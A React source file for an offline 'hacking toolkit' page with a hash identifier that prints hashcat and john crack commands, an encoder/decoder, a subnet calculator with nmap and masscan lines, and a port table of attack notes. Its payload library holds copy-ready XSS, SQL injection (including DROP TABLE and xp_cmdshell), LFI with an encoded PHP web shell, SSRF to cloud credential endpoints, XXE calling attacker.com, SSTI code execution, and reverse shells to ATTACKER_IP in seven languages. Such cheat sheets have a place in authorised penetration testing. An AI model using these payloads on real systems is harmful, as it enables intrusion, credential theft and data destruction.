import { useState, useCallback } from 'react'

// ── Hash identification ────────────────────────────────────────────────────────
const HASH_PATTERNS = [
  { name: 'MD5',          regex: /^[a-f0-9]{32}$/i,                     hashcat: '0',   john: 'raw-md5' },
  { name: 'SHA-1',        regex: /^[a-f0-9]{40}$/i,                     hashcat: '100', john: 'raw-sha1' },
  { name: 'SHA-256',      regex: /^[a-f0-9]{64}$/i,                     hashcat: '1400',john: 'raw-sha256' },
  { name: 'SHA-512',      regex: /^[a-f0-9]{128}$/i,                    hashcat: '1700',john: 'raw-sha512' },
  { name: 'SHA-384',      regex: /^[a-f0-9]{96}$/i,                     hashcat: '10800', john: 'raw-sha384' },
  { name: 'NTLM',         regex: /^[a-f0-9]{32}$/i,                     hashcat: '1000',john: 'nt' },
  { name: 'bcrypt',       regex: /^\$2[ayb]\$.{56}$/,                   hashcat: '3200',john: 'bcrypt' },
  { name: 'SHA-512crypt', regex: /^\$6\$.{8,16}\$.{86}$/,               hashcat: '1800',john: 'sha512crypt' },
  { name: 'SHA-256crypt', regex: /^\$5\$.{8,16}\$.{43}$/,               hashcat: '7400',john: 'sha256crypt' },
  { name: 'MD5crypt',     regex: /^\$1\$.{0,8}\$.{22}$/,                hashcat: '500', john: 'md5crypt' },
  { name: 'Argon2',       regex: /^\$argon2/,                           hashcat: null,  john: 'argon2' },
  { name: 'PBKDF2-SHA1',  regex: /^pbkdf2_sha1\$/,                      hashcat: '12000',john: null },
  { name: 'PBKDF2-SHA256',regex: /^pbkdf2_sha256\$/,                    hashcat: '10900',john: null },
  { name: 'Django (SHA1)',regex: /^sha1\$.+\$.{40}$/,                   hashcat: '800', john: null },
  { name: 'MySQL 4.x',    regex: /^\*[A-F0-9]{40}$/,                    hashcat: '300', john: 'mysql' },
  { name: 'LM',           regex: /^[a-f0-9]{32}$/i,                     hashcat: '3000',john: 'lm' },
  { name: 'WPA-PMKID',    regex: /^[a-f0-9]{32}\*/,                     hashcat: '22000',john: null },
  { name: 'CRC32',        regex: /^[a-f0-9]{8}$/i,                      hashcat: '11500',john: null },
]

function identifyHash(input) {
  const h = input.trim()
  if (!h) return []
  return HASH_PATTERNS.filter(p => p.regex.test(h))
}

// ── Encoder/Decoder ────────────────────────────────────────────────────────────
const ENCODINGS = ['Base64', 'Base64URL', 'Hex', 'URL', 'HTML', 'Binary', 'ROT13', 'JWT Decode']

function encode(mode, text) {
  try {
    switch (mode) {
      case 'Base64':    return btoa(unescape(encodeURIComponent(text)))
      case 'Base64URL': return btoa(unescape(encodeURIComponent(text))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'')
      case 'Hex':       return [...new TextEncoder().encode(text)].map(b => b.toString(16).padStart(2,'0')).join('')
      case 'URL':       return encodeURIComponent(text)
      case 'HTML':      return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;')
      case 'Binary':    return [...new TextEncoder().encode(text)].map(b => b.toString(2).padStart(8,'0')).join(' ')
      case 'ROT13':     return text.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)))
      case 'JWT Decode':return jwtDecode(text)
      default: return text
    }
  } catch (e) { return `[Error: ${e.message}]` }
}

function decode(mode, text) {
  try {
    switch (mode) {
      case 'Base64':    return decodeURIComponent(escape(atob(text)))
      case 'Base64URL': return decodeURIComponent(escape(atob(text.replace(/-/g,'+').replace(/_/g,'/'))))
      case 'Hex':       return new TextDecoder().decode(new Uint8Array(text.match(/.{1,2}/g).map(b => parseInt(b,16))))
      case 'URL':       return decodeURIComponent(text)
      case 'HTML':      return text.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"').replace(/&#x27;/g,"'")
      case 'Binary':    return new TextDecoder().decode(new Uint8Array(text.split(/\s+/).map(b => parseInt(b,2))))
      case 'ROT13':     return encode('ROT13', text)
      case 'JWT Decode':return jwtDecode(text)
      default: return text
    }
  } catch (e) { return `[Error: ${e.message}]` }
}

function jwtDecode(token) {
  try {
    const parts = token.split('.')
    if (parts.length !== 3) return '[Not a JWT — needs 3 parts]'
    const header = JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')))
    const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')))
    return `=== HEADER ===\n${JSON.stringify(header, null, 2)}\n\n=== PAYLOAD ===\n${JSON.stringify(payload, null, 2)}\n\n=== SIGNATURE ===\n${parts[2]}\n\n[Signature NOT verified — client-side only]`
  } catch (e) { return `[JWT decode error: ${e.message}]` }
}

// ── Subnet calculator ─────────────────────────────────────────────────────────
function calcSubnet(cidr) {
  try {
    const [ip, prefix] = cidr.trim().split('/')
    const pfx = parseInt(prefix, 10)
    if (pfx < 0 || pfx > 32 || !ip) return null
    const parts = ip.split('.').map(Number)
    if (parts.length !== 4 || parts.some(p => p < 0 || p > 255)) return null

    const ipInt = (parts[0] << 24 | parts[1] << 16 | parts[2] << 8 | parts[3]) >>> 0
    const mask = pfx === 0 ? 0 : (0xFFFFFFFF << (32 - pfx)) >>> 0
    const network = (ipInt & mask) >>> 0
    const broadcast = (network | (~mask >>> 0)) >>> 0
    const first = pfx >= 31 ? network : network + 1
    const last  = pfx >= 31 ? broadcast : broadcast - 1
    const hosts = pfx >= 31 ? (1 << (32 - pfx)) : Math.max(0, (1 << (32 - pfx)) - 2)

    const toIP = n => [(n >>> 24) & 0xFF, (n >>> 16) & 0xFF, (n >>> 8) & 0xFF, n & 0xFF].join('.')
    const toMask = n => toIP(n)

    return {
      network: toIP(network) + '/' + pfx,
      netmask: toMask(mask),
      wildcard: toMask(~mask >>> 0),
      broadcast: toIP(broadcast),
      first: toIP(first),
      last: toIP(last),
      hosts: hosts.toLocaleString(),
      ipClass: pfx <= 8 ? 'A' : pfx <= 16 ? 'B' : pfx <= 24 ? 'C' : 'VLSM',
    }
  } catch { return null }
}

// ── Port reference ────────────────────────────────────────────────────────────
const PORTS = [
  { port: 21,    proto: 'TCP', service: 'FTP',          notes: 'File transfer — try anon login, bruteforce' },
  { port: 22,    proto: 'TCP', service: 'SSH',          notes: 'Timing user enum, bruteforce, key-based' },
  { port: 23,    proto: 'TCP', service: 'Telnet',       notes: 'Cleartext — sniff creds, try default passwords' },
  { port: 25,    proto: 'TCP', service: 'SMTP',         notes: 'Email relay — VRFY/EXPN user enum' },
  { port: 53,    proto: 'UDP', service: 'DNS',          notes: 'Zone transfer (AXFR), subdomain enum' },
  { port: 80,    proto: 'TCP', service: 'HTTP',         notes: 'Web — dir bust, nikto, SQLi, XSS, LFI/RFI' },
  { port: 110,   proto: 'TCP', service: 'POP3',         notes: 'Email retrieval — bruteforce creds' },
  { port: 111,   proto: 'TCP', service: 'RPCbind',      notes: 'RPC mapper — rpcinfo -p <host>' },
  { port: 135,   proto: 'TCP', service: 'MSRPC',        notes: 'Windows RPC — SMB vector' },
  { port: 139,   proto: 'TCP', service: 'NetBIOS',      notes: 'SMB/NBT — enum4linux, smbclient' },
  { port: 143,   proto: 'TCP', service: 'IMAP',         notes: 'Email access — bruteforce' },
  { port: 161,   proto: 'UDP', service: 'SNMP',         notes: 'v1/v2: try community=public/private' },
  { port: 389,   proto: 'TCP', service: 'LDAP',         notes: 'AD queries — ldapsearch anonymous' },
  { port: 443,   proto: 'TCP', service: 'HTTPS',        notes: 'Like 80 + SSL strip, cert recon' },
  { port: 445,   proto: 'TCP', service: 'SMB',          notes: 'EternalBlue, Pass-the-Hash, shares enum' },
  { port: 512,   proto: 'TCP', service: 'rexec',        notes: 'Remote exec — try rlogin' },
  { port: 513,   proto: 'TCP', service: 'rlogin',       notes: 'No auth if .rhosts present' },
  { port: 514,   proto: 'TCP', service: 'rsh',          notes: 'Remote shell — check .rhosts' },
  { port: 873,   proto: 'TCP', service: 'rsync',        notes: 'List/download modules without auth' },
  { port: 1433,  proto: 'TCP', service: 'MSSQL',        notes: 'xp_cmdshell, linked servers, SA bruteforce' },
  { port: 1521,  proto: 'TCP', service: 'Oracle DB',    notes: 'SID enum, TNS listener attack' },
  { port: 2049,  proto: 'TCP', service: 'NFS',          notes: 'showmount -e — mount exposed shares' },
  { port: 2375,  proto: 'TCP', service: 'Docker API',   notes: 'Unauthenticated — container escape to host' },
  { port: 3000,  proto: 'TCP', service: 'Dev HTTP',     notes: 'Grafana, Node apps — default creds' },
  { port: 3306,  proto: 'TCP', service: 'MySQL',        notes: 'Bruteforce, SQLi via app, INTO OUTFILE' },
  { port: 3389,  proto: 'TCP', service: 'RDP',          notes: 'BlueKeep (CVE-2019-0708), NLA bypass' },
  { port: 4444,  proto: 'TCP', service: 'Metasploit',   notes: 'Default MSF listener port' },
  { port: 5432,  proto: 'TCP', service: 'PostgreSQL',   notes: 'Bruteforce postgres:postgres — COPY to shell' },
  { port: 5900,  proto: 'TCP', service: 'VNC',          notes: 'No auth or weak passwords — screenshot' },
  { port: 5985,  proto: 'TCP', service: 'WinRM HTTP',   notes: 'PowerShell remoting — evil-winrm' },
  { port: 5986,  proto: 'TCP', service: 'WinRM HTTPS',  notes: 'PowerShell remoting over TLS' },
  { port: 6379,  proto: 'TCP', service: 'Redis',        notes: 'Unauthenticated — write SSH keys / cron' },
  { port: 6443,  proto: 'TCP', service: 'K8s API',      notes: 'Kubernetes — check anonymous access' },
  { port: 8080,  proto: 'TCP', service: 'HTTP Alt',     notes: 'Tomcat manager /manager/html default creds' },
  { port: 8443,  proto: 'TCP', service: 'HTTPS Alt',    notes: 'Same as 8080 over TLS' },
  { port: 8888,  proto: 'TCP', service: 'Jupyter',      notes: 'Often no auth — RCE via notebook' },
  { port: 9200,  proto: 'TCP', service: 'Elasticsearch',notes: 'No auth — read all data, write scripts' },
  { port: 11211, proto: 'TCP', service: 'Memcached',    notes: 'No auth — dump all cached data' },
  { port: 27017, proto: 'TCP', service: 'MongoDB',      notes: 'No auth by default — dump all databases' },
]

// ── Payload library ───────────────────────────────────────────────────────────
const PAYLOADS = {
  'XSS': [
    `<script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<svg onload=alert(1)>`,
    `"><script>alert(document.cookie)</script>`,
    `javascript:alert(1)`,
    `'-alert(1)-'`,
    `<iframe src="javascript:alert(1)">`,
    `<body onload=alert(1)>`,
    `<input autofocus onfocus=alert(1)>`,
    `<details open ontoggle=alert(1)>`,
  ],
  'SQL Injection': [
    `' OR '1'='1'--`,
    `' OR 1=1--`,
    `admin'--`,
    `' UNION SELECT null,null,null--`,
    `' UNION SELECT username,password,null FROM users--`,
    `1; DROP TABLE users--`,
    `' AND 1=SLEEP(5)--`,
    `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`,
    `'; EXEC xp_cmdshell('whoami')--`,
    `' OR 1=1 LIMIT 1--`,
  ],
  'LFI': [
    `../../../etc/passwd`,
    `../../../../etc/passwd%00`,
    `....//....//....//etc/passwd`,
    `/proc/self/environ`,
    `/var/log/apache2/access.log`,
    `php://filter/convert.base64-encode/resource=index.php`,
    `php://input`,
    `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
    `expect://id`,
    `/proc/self/fd/0`,
  ],
  'Command Injection': [
    `; id`,
    `| id`,
    `|| id`,
    `&& id`,
    `\`id\``,
    `$(id)`,
    `; cat /etc/passwd`,
    `; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
    `| nc 10.0.0.1 4444 -e /bin/sh`,
    `; python3 -c "import os,socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));[subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())]"`,
  ],
  'SSRF': [
    `http://169.254.169.254/latest/meta-data/`,
    `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    `http://metadata.google.internal/computeMetadata/v1/`,
    `http://100.100.100.200/latest/meta-data/`,
    `http://localhost/admin`,
    `http://127.0.0.1:6379/`,
    `http://[::1]/admin`,
    `file:///etc/passwd`,
    `dict://127.0.0.1:6379/info`,
    `gopher://127.0.0.1:6379/_INFO`,
  ],
  'XXE': [
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>`,
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root/>`,
    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]><foo>&xxe;</foo>`,
  ],
  'SSTI': [
    `{{7*7}}`,
    `${7*7}`,
    `<%= 7*7 %>`,
    `{{config}}`,
    `{{''.__class__.__mro__[1].__subclasses__()}}`,
    `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
    `#{7*7}`,
    `*{7*7}`,
    `@(7*7)`,
  ],
  'Reverse Shells': [
    `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`,
    `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    `php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`,
    `nc -e /bin/sh ATTACKER_IP 4444`,
    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f`,
    `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    `perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  ],
}

// ── Main component ────────────────────────────────────────────────────────────
export default function UtilitiesPage() {
  const [tab, setTab] = useState('hash')

  const TABS = [
    { id: 'hash',    label: 'Hash ID',    color: 'var(--accent-cyan)' },
    { id: 'encode',  label: 'Encode/Decode', color: 'var(--accent-purple)' },
    { id: 'subnet',  label: 'Subnet Calc',color: 'var(--accent-green)' },
    { id: 'ports',   label: 'Port Ref',   color: 'var(--accent-orange)' },
    { id: 'payloads',label: 'Payloads',   color: 'var(--accent-red)' },
  ]

  return (
    <div style={{ height: '100%', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
      {/* Header */}
      <div style={{ padding: '12px 20px', borderBottom: '1px solid var(--border)', flexShrink: 0 }}>
        <div style={{ color: 'var(--accent-cyan)', fontSize: 14, fontWeight: 700, letterSpacing: 3 }}>UTILITIES</div>
        <div style={{ color: 'var(--text-muted)', fontSize: 10 }}>HACKING TOOLKIT — OFFLINE, CLIENT-SIDE</div>
      </div>

      {/* Tab bar */}
      <div style={{ display: 'flex', borderBottom: '1px solid var(--border)', flexShrink: 0 }}>
        {TABS.map(t => (
          <button
            key={t.id}
            onClick={() => setTab(t.id)}
            style={{
              padding: '8px 18px', background: 'transparent', border: 'none', cursor: 'pointer',
              color: tab === t.id ? t.color : 'var(--text-muted)',
              borderBottom: tab === t.id ? `2px solid ${t.color}` : '2px solid transparent',
              fontFamily: 'inherit', fontSize: 11, letterSpacing: 1, textTransform: 'uppercase',
              transition: 'all 0.15s',
            }}
          >
            {t.label}
          </button>
        ))}
      </div>

      {/* Content */}
      <div style={{ flex: 1, overflow: 'auto', padding: 20 }}>
        {tab === 'hash'    && <HashTab />}
        {tab === 'encode'  && <EncodeTab />}
        {tab === 'subnet'  && <SubnetTab />}
        {tab === 'ports'   && <PortsTab />}
        {tab === 'payloads'&& <PayloadsTab />}
      </div>
    </div>
  )
}

// ── Hash ID tab ───────────────────────────────────────────────────────────────
function HashTab() {
  const [input, setInput] = useState('')
  const matches = identifyHash(input)

  return (
    <div style={{ maxWidth: 720 }}>
      <SectionTitle color="var(--accent-cyan)">HASH IDENTIFIER</SectionTitle>
      <textarea
        className="cyber-input"
        rows={3}
        placeholder="Paste a hash here..."
        value={input}
        onChange={e => setInput(e.target.value)}
        style={{ width: '100%', resize: 'vertical', fontFamily: 'monospace', fontSize: 12 }}
      />
      {input.trim() && (
        <div style={{ marginTop: 12 }}>
          {matches.length === 0 ? (
            <div style={{ color: 'var(--accent-red)', fontSize: 12 }}>No matching hash type found</div>
          ) : (
            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
              <thead>
                <tr>
                  {['Type', 'Hashcat Mode', 'John Format', 'Confidence'].map(h => (
                    <th key={h} style={{ color: 'var(--text-muted)', textAlign: 'left', padding: '4px 8px', borderBottom: '1px solid var(--border)', fontSize: 10, letterSpacing: 1 }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {matches.map((m, i) => (
                  <tr key={i} style={{ borderBottom: '1px solid var(--border)22' }}>
                    <td style={{ padding: '6px 8px', color: 'var(--accent-cyan)', fontWeight: 600 }}>{m.name}</td>
                    <td style={{ padding: '6px 8px', color: 'var(--accent-yellow)', fontFamily: 'monospace' }}>{m.hashcat ?? '—'}</td>
                    <td style={{ padding: '6px 8px', color: 'var(--accent-green)', fontFamily: 'monospace' }}>{m.john ?? '—'}</td>
                    <td style={{ padding: '6px 8px', color: 'var(--text-muted)' }}>{matches.length === 1 ? 'High' : 'Medium'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
          {matches.length > 0 && (
            <div style={{ marginTop: 12, padding: 12, background: 'var(--bg-card)', border: '1px solid var(--border)' }}>
              <div style={{ color: 'var(--accent-purple)', fontSize: 10, letterSpacing: 1, marginBottom: 6 }}>CRACK COMMANDS</div>
              {matches.slice(0, 1).map(m => (
                <div key={m.name} style={{ fontFamily: 'monospace', fontSize: 11, color: 'var(--text-secondary)' }}>
                  {m.hashcat && <div style={{ marginBottom: 4 }}>hashcat -m {m.hashcat} hash.txt rockyou.txt</div>}
                  {m.john && <div>john --format={m.john} hash.txt --wordlist=rockyou.txt</div>}
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  )
}

// ── Encode/Decode tab ─────────────────────────────────────────────────────────
function EncodeTab() {
  const [input, setInput] = useState('')
  const [mode, setMode] = useState('Base64')
  const [encoded, setEncoded] = useState('')
  const [decoded, setDecoded] = useState('')

  const run = useCallback(() => {
    setEncoded(encode(mode, input))
    setDecoded(decode(mode, input))
  }, [input, mode])

  return (
    <div style={{ maxWidth: 720 }}>
      <SectionTitle color="var(--accent-purple)">ENCODER / DECODER</SectionTitle>
      <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 12 }}>
        {ENCODINGS.map(e => (
          <button
            key={e}
            onClick={() => setMode(e)}
            style={{
              padding: '4px 12px', background: mode === e ? 'rgba(138,43,226,0.2)' : 'var(--bg-secondary)',
              border: `1px solid ${mode === e ? 'var(--accent-purple)' : 'var(--border)'}`,
              color: mode === e ? 'var(--accent-purple)' : 'var(--text-muted)',
              cursor: 'pointer', fontFamily: 'inherit', fontSize: 11,
            }}
          >
            {e}
          </button>
        ))}
      </div>
      <textarea
        className="cyber-input"
        rows={4}
        placeholder="Input text..."
        value={input}
        onChange={e => setInput(e.target.value)}
        style={{ width: '100%', resize: 'vertical', fontFamily: 'monospace', fontSize: 12, marginBottom: 8 }}
      />
      <button className="cyber-btn" onClick={run} style={{ marginBottom: 16 }}>ENCODE + DECODE</button>
      {encoded && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          <OutputBox label="ENCODED" color="var(--accent-green)" value={encoded} />
          <OutputBox label="DECODED" color="var(--accent-yellow)" value={decoded} />
        </div>
      )}
    </div>
  )
}

function OutputBox({ label, color, value }) {
  const [copied, setCopied] = useState(false)
  const copy = () => { navigator.clipboard.writeText(value); setCopied(true); setTimeout(() => setCopied(false), 1500) }
  return (
    <div style={{ background: 'var(--bg-card)', border: `1px solid ${color}44`, padding: 12 }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
        <span style={{ color, fontSize: 10, letterSpacing: 1 }}>{label}</span>
        <button onClick={copy} style={{ background: 'transparent', border: 'none', color: copied ? 'var(--accent-green)' : 'var(--text-muted)', cursor: 'pointer', fontSize: 10, fontFamily: 'inherit' }}>
          {copied ? '✓ COPIED' : 'COPY'}
        </button>
      </div>
      <pre style={{ margin: 0, color: 'var(--text-primary)', fontSize: 11, fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 200, overflow: 'auto' }}>{value}</pre>
    </div>
  )
}

// ── Subnet calc tab ───────────────────────────────────────────────────────────
function SubnetTab() {
  const [cidr, setCidr] = useState('192.168.1.0/24')
  const result = calcSubnet(cidr)

  return (
    <div style={{ maxWidth: 600 }}>
      <SectionTitle color="var(--accent-green)">SUBNET CALCULATOR</SectionTitle>
      <input
        className="cyber-input"
        value={cidr}
        onChange={e => setCidr(e.target.value)}
        placeholder="e.g. 10.10.10.0/24"
        style={{ width: '100%', marginBottom: 16, fontFamily: 'monospace', fontSize: 13 }}
      />
      {result ? (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
          {[
            ['Network',    result.network,   'var(--accent-cyan)'],
            ['Netmask',    result.netmask,   'var(--text-primary)'],
            ['Wildcard',   result.wildcard,  'var(--text-primary)'],
            ['Broadcast',  result.broadcast, 'var(--accent-orange)'],
            ['First Host', result.first,     'var(--accent-green)'],
            ['Last Host',  result.last,      'var(--accent-green)'],
            ['Usable Hosts', result.hosts,   'var(--accent-yellow)'],
            ['Class',      result.ipClass,   'var(--accent-purple)'],
          ].map(([label, value, color]) => (
            <div key={label} style={{ display: 'flex', gap: 12, padding: '5px 0', borderBottom: '1px solid var(--border)22' }}>
              <span style={{ color: 'var(--text-muted)', fontSize: 12, minWidth: 120 }}>{label}</span>
              <span style={{ color, fontFamily: 'monospace', fontSize: 13, fontWeight: 600 }}>{value}</span>
            </div>
          ))}
          <div style={{ marginTop: 12, padding: 10, background: 'var(--bg-card)', border: '1px solid var(--border)', fontSize: 11, color: 'var(--text-muted)', fontFamily: 'monospace' }}>
            nmap -sV -sC {result.network} --open<br />
            masscan {result.network} -p0-65535 --rate=5000
          </div>
        </div>
      ) : cidr.trim() ? (
        <div style={{ color: 'var(--accent-red)', fontSize: 12 }}>Invalid CIDR notation</div>
      ) : null}
    </div>
  )
}

// ── Port reference tab ────────────────────────────────────────────────────────
function PortsTab() {
  const [filter, setFilter] = useState('')
  const filtered = PORTS.filter(p =>
    String(p.port).includes(filter) ||
    p.service.toLowerCase().includes(filter.toLowerCase()) ||
    p.notes.toLowerCase().includes(filter.toLowerCase())
  )

  return (
    <div>
      <SectionTitle color="var(--accent-orange)">PORT QUICK REFERENCE</SectionTitle>
      <input
        className="cyber-input"
        placeholder="Filter by port, service, or notes..."
        value={filter}
        onChange={e => setFilter(e.target.value)}
        style={{ width: '100%', maxWidth: 400, marginBottom: 12 }}
      />
      <div style={{ overflowX: 'auto' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
          <thead>
            <tr>
              {['Port', 'Proto', 'Service', 'Attack Notes'].map(h => (
                <th key={h} style={{ color: 'var(--text-muted)', textAlign: 'left', padding: '4px 10px', borderBottom: '1px solid var(--border)', fontSize: 10, letterSpacing: 1, whiteSpace: 'nowrap' }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {filtered.map(p => (
              <tr key={p.port} style={{ borderBottom: '1px solid var(--border)22' }}
                onMouseEnter={e => e.currentTarget.style.background = 'var(--bg-hover)'}
                onMouseLeave={e => e.currentTarget.style.background = 'transparent'}
              >
                <td style={{ padding: '5px 10px', color: 'var(--accent-cyan)', fontFamily: 'monospace', fontWeight: 700 }}>{p.port}</td>
                <td style={{ padding: '5px 10px', color: 'var(--accent-purple)', fontFamily: 'monospace', fontSize: 10 }}>{p.proto}</td>
                <td style={{ padding: '5px 10px', color: 'var(--accent-yellow)', whiteSpace: 'nowrap' }}>{p.service}</td>
                <td style={{ padding: '5px 10px', color: 'var(--text-secondary)' }}>{p.notes}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

// ── Payload library tab ───────────────────────────────────────────────────────
function PayloadsTab() {
  const [cat, setCat] = useState('XSS')
  const [copied, setCopied] = useState(null)

  const copyPayload = (payload, idx) => {
    navigator.clipboard.writeText(payload)
    setCopied(idx)
    setTimeout(() => setCopied(null), 1500)
  }

  return (
    <div>
      <SectionTitle color="var(--accent-red)">PAYLOAD LIBRARY</SectionTitle>
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', marginBottom: 16 }}>
        {Object.keys(PAYLOADS).map(c => (
          <button
            key={c}
            onClick={() => setCat(c)}
            style={{
              padding: '4px 12px',
              background: cat === c ? 'rgba(255,50,50,0.15)' : 'var(--bg-secondary)',
              border: `1px solid ${cat === c ? 'var(--accent-red)' : 'var(--border)'}`,
              color: cat === c ? 'var(--accent-red)' : 'var(--text-muted)',
              cursor: 'pointer', fontFamily: 'inherit', fontSize: 11,
            }}
          >
            {c}
          </button>
        ))}
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
        {PAYLOADS[cat].map((payload, idx) => (
          <div
            key={idx}
            style={{
              display: 'flex', alignItems: 'flex-start', gap: 10,
              padding: '8px 12px',
              background: 'var(--bg-card)',
              border: '1px solid var(--border)',
            }}
          >
            <pre style={{
              flex: 1, margin: 0, fontSize: 11, fontFamily: 'monospace',
              color: 'var(--accent-green)', whiteSpace: 'pre-wrap', wordBreak: 'break-all',
            }}>{payload}</pre>
            <button
              onClick={() => copyPayload(payload, idx)}
              style={{
                background: 'transparent', border: '1px solid var(--border)',
                color: copied === idx ? 'var(--accent-green)' : 'var(--text-muted)',
                padding: '2px 8px', cursor: 'pointer', fontFamily: 'inherit', fontSize: 10,
                flexShrink: 0, transition: 'all 0.15s',
              }}
            >
              {copied === idx ? '✓' : 'COPY'}
            </button>
          </div>
        ))}
      </div>
    </div>
  )
}

function SectionTitle({ children, color }) {
  return (
    <div style={{ color, fontSize: 11, letterSpacing: 2, textTransform: 'uppercase', marginBottom: 14, paddingBottom: 6, borderBottom: `1px solid ${color}33` }}>
      {children}
    </div>
  )
}
